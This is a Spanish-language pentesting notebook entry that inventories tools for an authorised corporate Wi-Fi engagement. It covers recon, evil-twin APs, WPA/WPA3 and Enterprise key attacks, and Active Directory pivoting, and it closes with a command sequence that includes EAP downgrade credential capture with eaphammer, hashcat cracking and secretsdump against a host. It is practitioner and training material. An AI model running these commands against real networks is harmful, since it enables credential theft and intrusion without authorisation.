---
tags:
  - Wi-Fi/Enterprise
  - Tipo/Arsenal
  - Pentesting/Explotacion
Descripción: "El set completo de un engagement inalámbrico corporativo, con el estado real de cada herramienta y la configuración mínima de la caja de ataque"
Fecha de actualización: 2026-08-04
Nota previa: "[[12 - Detección y evasión en entorno corporativo]]"
Nota siguiente: 
Area: "[[Wi-Fi corporativo.base|Wi-Fi corporativo]]"
---
---

Estado verificado contra la API de GitHub el **2026-08-04**. Un engagement corporativo encadena cuatro conjuntos de herramientas —radio, suplantación, red y dominio— y la mayoría de fallos operativos vienen de la transición entre ellos, no de la herramienta en sí.

# Reconocimiento

| Herramienta | Estado | Papel |
| ----------- | ------ | ----- |
| **`airodump-ng`** | Suite 1.7 (may-2022) | Barrido rápido, filtro `--essid`, columna `--wps` |
| **`Kismet`** | **2025-09-R1** (sep-2025) | Entornos con muchos AP; correlación cliente↔AP persistente |
| **`Wireshark`** | Activo | **Imprescindible**: leer el `RSN IE` para AKM y `PMF` |
| `airgraph-ng` | Con la suite | Grafo de *probe requests* (CPG) |
| `hcxdumptool` | 7.1.2 (feb-2026) | Captura con filtro BPF y salida `pcapng` |

<mark style="background: #FFB86CA6;">Wireshark no es opcional en este flujo</mark>: `airodump-ng` resume la seguridad en dos columnas y eso no basta para decidir entre downgrade, PMKID o evil twin. Los filtros concretos están en [[01 - Reconocimiento de un parque de APs]].

# Suplantación y AP falso

| Herramienta | Estado | Cuándo |
| ----------- | ------ | ------ |
| **`EAPHammer`** | v1.14.1 (sep-2024) | **WPA-Enterprise**: certificados, downgrade EAP, captura |
| **`hostapd`** | Activo | AP falso a medida; el único con SAE, OWE y 6 GHz |
| `hostapd-mana` | Repo activo, release 2.6.5 de **2019** | Karma/MANA y captura EAP con control fino |
| **`airgeddon`** | Muy activo (jul-2026) | Menú unificado; la más viva del ecosistema |
| `Fluxion` | Activo (jul-2026) | Portal cautivo con validación de handshake |
| `wifiphisher` | Repo activo, release **v1.4 de 2018** | Plantillas de phishing ricas |
| `wifipumpkin3` | Estancado (ene-2024) | Framework MITM general |

> [!warning]+ Repositorio activo ≠ versión publicada
> `wifiphisher` recibe commits pero su última release etiquetada es de **enero de 2018**; `hostapd-mana`, de **enero de 2019**. En la práctica se instalan desde `git`, y eso hay que preverlo al preparar una caja de ataque sin acceso a internet en la sede del cliente.

# Ataque a la clave

| Herramienta | Papel |
| ----------- | ----- |
| `reaver` + `bully` | WPS por PIN. Release v1.6.6 (mar-2020), `master` activo |
| `hcxpcapngtool` / `hcxhashtool` / `hcxpsktool` | Conversión, filtrado por alcance y candidatas |
| **`hashcat`** 7.1.2 | `-m 22000` para PSK, `-m 5500` para MSCHAPv2 |
| `wacker` | Fuerza bruta online contra WPA3-SAE. Último push jul-2023 |
| `crack.sh` | Barrido DES completo para MSCHAPv2 |

El árbol de decisión completo y el flujo de comandos están en [[11 - Arsenal de cracking Wi-Fi]].

# Red interna y dominio

| Herramienta | Papel |
| ----------- | ----- |
| `nmap` | Descubrimiento. **7.99** es la versión actual; los cursos muestran 7.80 (2019) |
| `NetExec` (`nxc`) | Muy activo. Sustituto de CrackMapExec |
| `Impacket` | Muy activo. `secretsdump`, `GetUserSPNs`, `wmiexec` |
| `evil-winrm` | Shell interactiva sobre WinRM |
| **BloodHound CE** + SharpHound | Rutas de ataque. **La edición legacy con `neo4j start` está superada** |
| `PrintSpoofer` / `GodPotato` | `SeImpersonate` en sistemas modernos |
| `mimikatz` | Volcado de credenciales |
| `ciscot7` | Revertir contraseñas Cisco tipo 7, en local |

> [!warning]+ `JuicyPotato` sólo funciona en sistemas antiguos
> Su repositorio no se toca desde **diciembre de 2021**, y <mark style="background: #FF5582A6;">el vector que explota está cerrado desde Windows 10 1809 y Server 2019</mark>. Sirve contra el Server 2016 del laboratorio y contra poco más. La familia vigente es `PrintSpoofer`/`GodPotato`/`SigmaPotato` — ver [[04 - SeImpersonate y la familia Potato]].

# La caja de ataque

El requisito que más veces se subestima es el **número de radios**. Un evil twin necesita tres roles simultáneos:

| Rol | Interfaz | Modo |
| --- | -------- | ---- |
| Reconocimiento y deauth | `wlan0` | Monitor |
| AP falso | `wlan1` | Master |
| Cliente asociado a la red real | `wlan2` | Managed |

Con dos adaptadores hay que ir alternando y se pierden capturas; con tres el flujo es continuo. La elección de chipset —inyección, bandas, 6 GHz— está en [[04 - Interfaces, chipsets y drivers]].

Software base a preparar antes de desplazarse:

```shell-session
$ sudo apt install aircrack-ng kismet hostapd wireshark hashcat hcxtools hcxdumptool \
      reaver bully nmap hydra macchanger
$ git clone https://github.com/s0lst1c3/eaphammer && cd eaphammer && ./kali-setup
$ git clone https://github.com/v1s1t0r1sh3r3/airgeddon
$ pipx install impacket netexec
```

<mark style="background: #FFB8EBA6;">Conviene resolver los conflictos de servicios **antes** del engagement</mark>, no en la sede del cliente: `NetworkManager` reclama las interfaces, `wpa_supplicant` interfiere con el modo monitor y `systemd-resolved` ocupa el puerto 53 que `dnsmasq` necesita.

```shell-session
$ sudo airmon-ng check kill              # NetworkManager + wpa_supplicant
$ sudo systemctl stop systemd-resolved   # libera el 53
```

# Herramientas que hay que descartar

| Pieza | Estado | Sustituto |
| ----- | ------ | --------- |
| `cowpatty` / `genpmk` | Último commit **2018** | `hcxpcapngtool` |
| `drygdryg/wpspin`, `drygdryg/OneShot` | **404 en GitHub** | `hcxpsktool --wpskeys`, `fulvius31/OneShot` |
| `air-hammer` | `python2`, sin releases | Spraying acotado, o captura offline |
| `JuicyPotato` | Vector cerrado desde 2019 | `PrintSpoofer` / `GodPotato` |
| `sslstrip` | HSTS lo neutralizó | Sólo contra el portal cautivo, en HTTP |
| BloodHound legacy | Superado | **BloodHound CE** |
| `ifconfig`, `route`, `iwconfig` | `net-tools`/`wireless-tools` deprecados | `ip`, `iw` |

<mark style="background: #8000E1A6;">Las dos URL que devuelven **404** son las más peligrosas de la lista</mark>: siguen enlazadas en cursos y tutoriales, y la cuenta de origen está libre para que cualquiera la registre. Instalar una herramienta de credenciales desde ahí es un riesgo evitable.

# La secuencia completa

```shell-session
# 1. Reconocimiento acotado al alcance
$ sudo airodump-ng wlan0mon --essid StarLight-ENT --wps -w recon
$ wireshark recon-01.cap        # wlan.rsn.akms.type · wlan.rsn.capabilities.mfpr

# 2. Según el AKM encontrado
# PSK: PMKID y handshake, acotado por BPF al alcance autorizado
$ sudo hcxdumptool -i wlan1 -c 1a --bpf=alcance.bpf --exitoneapol -w cap.pcapng
# WPA3 en modo transición: AP falso que sólo ofrece WPA2
$ sudo hostapd downgrade.conf
# Enterprise: AP falso con RADIUS propio y downgrade de método EAP
$ sudo ./eaphammer -i wlan1 --auth wpa-eap --essid StarLight-ENT --negotiate weakest --creds

# 3. Explotar el material
$ hcxpcapngtool -o hash.hc22000 cap.pcapng && hashcat -m 22000 hash.hc22000 wordlist.txt
$ hashcat -m 5500 reto.txt wordlist.txt -r best64.rule

# 4. Pivote
$ nxc smb 172.16.10.72 -u usuario -p 'clave' --shares
$ secretsdump.py dominio/usuario:'clave'@172.16.10.72
```

El detalle de cada paso está en las notas de este sub-tema; esta secuencia es el guion que las ordena.
